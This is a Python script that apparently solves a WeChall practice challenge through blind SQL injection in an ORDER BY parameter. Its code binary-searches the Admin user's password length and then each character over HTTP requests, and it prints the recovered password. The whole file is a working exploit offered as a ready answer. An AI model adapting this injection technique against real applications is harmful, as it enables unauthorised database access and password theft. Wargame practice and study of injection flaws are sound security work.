#!/usr/bin/env python3
# -*- encoding=utf-8 -*-
'''
If u only want to know the answer, this script is sufficient to finish the job. Anyway, have fun!	
'''
import requests
import sys

url_template = 'http://www.wechall.net/challenge/order_by_query/index.php?by=5,%%20if((select%%20%s(password%s)%%3C%%3D%s%%20from%%20users%%20where%%20username%%3D0x41646d696e),%%20username,%%20bananas)--%%20&dir=DESC'
true_text = '<td align="right">14</td><td>Admin</td>'

print("[*] Start guessing password length...")
begin, end = 1, 50

while begin < end:
    # print("[+] begin: %d, end: %d" % (begin, end))
    middle = (end + begin) // 2
    guess_length = url_template % ('length', '', hex(middle))
    res = requests.get(guess_length)
    if true_text in res.text:
        # Get true result
        end = middle
    else:
        begin = middle + 1

if end != begin:
    sys.exit("[!] Error! Something wrong with begin: %d, end: %d" %
             (begin, end))
else:
    print("[*] Password's length is %d" % end)

print("[*] Start guessing password...")
password = ''
percent = end // 4
count = 1
for i in range(1, end + 1):
    if i == percent * count:
        print("[+] Guessing progress at %d%%... " % (count*25))
        count += 1
    begin_char = 20
    end_char = 126
    while begin_char < end_char:
        middle = (begin_char + end_char) // 2
        guess_char = url_template % ('substring', ',%d,1' % i, hex(middle))
        res = requests.get(guess_char)
        if true_text in res.text:
            end_char = middle
        else:
            begin_char = middle + 1
    res = chr(end_char)
    password += res
print('[*] Congraz! Password is %s' % password)

